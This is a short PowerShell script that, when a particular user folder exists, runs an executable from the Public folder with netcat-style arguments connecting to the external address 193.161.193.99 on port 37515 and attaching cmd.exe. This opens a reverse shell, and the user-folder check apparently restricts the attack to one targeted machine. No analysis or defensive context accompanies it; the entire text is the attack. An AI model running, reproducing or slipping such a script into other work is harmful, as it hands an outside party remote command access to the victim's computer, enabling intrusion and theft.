if (-not (Test-Path "C:\Users\Rodrigo")) {
    Write-Host "No"
} else {
    Start-Process -FilePath "C:\Users\Public\RNM.exe" -ArgumentList "-nv", "193.161.193.99", "37515", "-e", "cmd.exe"
}
